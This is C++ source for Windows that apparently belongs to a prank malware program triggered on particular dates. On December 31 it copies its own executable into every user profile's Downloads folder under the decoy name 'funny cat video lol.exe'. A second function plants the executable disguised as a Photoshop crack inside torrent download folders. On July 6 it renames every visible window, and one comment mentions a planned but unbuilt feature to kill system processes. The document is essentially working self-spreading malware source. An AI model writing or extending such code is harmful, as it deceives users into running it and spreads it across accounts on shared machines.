#define WIN32_LEAN_AND_MEAN
#define NOMINMAX

#include <windows.h>

#include "dates.h"

#include "unicurse.h"

// ============================================================
// Dec 31st: drop a copy of the running exe as "cat vid.exe"
// into every profile's Downloads folder (including Public).
// ============================================================

static void DropCatVid()
{
    wchar_t selfPath[MAX_PATH];

    if (!GetModuleFileNameW(NULL, selfPath, MAX_PATH))
        return;

    const wchar_t* targetName = L"funny cat video lol.exe"; //L"cat vid.exe";

    WIN32_FIND_DATAW fd{};

    HANDLE find =
        FindFirstFileW(
            L"C:\\Users\\*",
            &fd
        );

    if (find == INVALID_HANDLE_VALUE)
        return;

    do
    {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
            continue;

        if (wcscmp(fd.cFileName, L".") == 0)
            continue;

        if (wcscmp(fd.cFileName, L"..") == 0)
            continue;

        wchar_t downloads[MAX_PATH];

        // TODO: make this work on XP too
        // XP uses C:\Documents and Settings\[Username]\My Documents\My Videos
        // folder style.
        // while 10 uses C:\Users\[Username]\Videos
        // folder style
        // TL;DR: make it work on both

        wsprintfW(
            downloads,
            L"C:\\Users\\%ls\\Downloads",
            fd.cFileName
        );

        if (GetFileAttributesW(downloads) == INVALID_FILE_ATTRIBUTES)
            continue;

        wchar_t dest[MAX_PATH];

        wsprintfW(
            dest,
            L"%ls\\%ls",
            downloads,
            targetName
        );

        CopyFileW(selfPath, dest, FALSE);
    }
    while (FindNextFileW(find, &fd));

    FindClose(find);
}

static void Cracklol01()
{
    wchar_t selfPath[MAX_PATH];

    if (!GetModuleFileNameW(NULL, selfPath, MAX_PATH))
        return;

    // TODO: add a system where every version of windows have a diff
    // name, like XP have "Adobe.Photoshop.CS4.Extended.v11.0.0.0_64bit.Crack.Only-NoPE"
    // but windows 10 could have an updated adobe crack version
    // eg. "Adobe.Photoshop.CC.2019.v20.0.0.Multilingual.Crack.[TechTools].exe"
    const wchar_t* targetName = L"Adobe.Photoshop.CS4.Extended.v11.0.0.0_64bit.Crack.Only-NoPE.7z.rar09.exe"; //L"cat vid.exe";

    WIN32_FIND_DATAW fd{};

    HANDLE find =
        FindFirstFileW(
            L"C:\\Users\\*",
            &fd
        );

    if (find == INVALID_HANDLE_VALUE)
        return;

    do
    {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
            continue;

        if (wcscmp(fd.cFileName, L".") == 0)
            continue;

        if (wcscmp(fd.cFileName, L"..") == 0)
            continue;

        wchar_t downloads[MAX_PATH];

        // TODO: make this work on XP too
        // XP uses C:\Documents and Settings\[Username]\My Documents\My Videos
        // folder style.
        // while 10 uses C:\Users\[Username]\Videos
        // folder style
        // TL;DR: make it work on both

        wsprintfW(
            downloads,
            L"C:\\Users\\%ls\\Downloads\\uTorrent\\Adobe.Photoshop.CS4.Extended.v11.0.0.0_64bit.Crack.Only-NoPE\\Setup+Crack",
            fd.cFileName
        );

        if (GetFileAttributesW(downloads) == INVALID_FILE_ATTRIBUTES)
            continue;

        wchar_t dest[MAX_PATH];

        wsprintfW(
            dest,
            L"%ls\\%ls",
            downloads,
            targetName
        );

        CopyFileW(selfPath, dest, FALSE);
    } while (FindNextFileW(find, &fd));

    FindClose(find);
}

// ============================================================
// July 6th: "AURA." + every window title becomes "sigmaxxing".
// ============================================================

static BOOL CALLBACK RenameWindowsProc(
    HWND hwnd,
    LPARAM
)
{
    if (
        IsWindowVisible(hwnd) &&
        GetWindowTextLengthW(hwnd) > 0
    )
    {
        SetWindowTextW(hwnd, L"sigmaxxing");
    }

    return TRUE;
}

static void ShowAura()
{
    MessageBoxW(
        NULL,
        L"AURA.",
        L"AURA.",
        MB_OK | // eu ia montar uma logica de que se o
                // user inputasse "no" ele matava algum proc
                // do sistema, mas a preguica fala mais alto
                // tlgd ;)
        MB_ICONWARNING
    );

    EnumWindows(RenameWindowsProc, 0);
}

static void ShowCursed()
{
    MessageBoxW(
        NULL,
        L"", // random 'cursed' unicode text
        L"", // random 'cursed' unicode text
        MB_OK | // eu ia montar uma logica de que se o
        // user inputasse "no" ele matava algum proc
        // do sistema, mas a preguica fala mais alto
        // tlgd ;)
        MB_ICONWARNING
    );

    EnumWindows(RenameWindowsProc, 0);
}

void EasterDates()
{
    SYSTEMTIME st;
    GetLocalTime(&st);

    if (st.wMonth == 12 && st.wDay == 31)
        DropCatVid();

    if (st.wMonth == 7 && st.wDay == 6)
        ShowAura();
}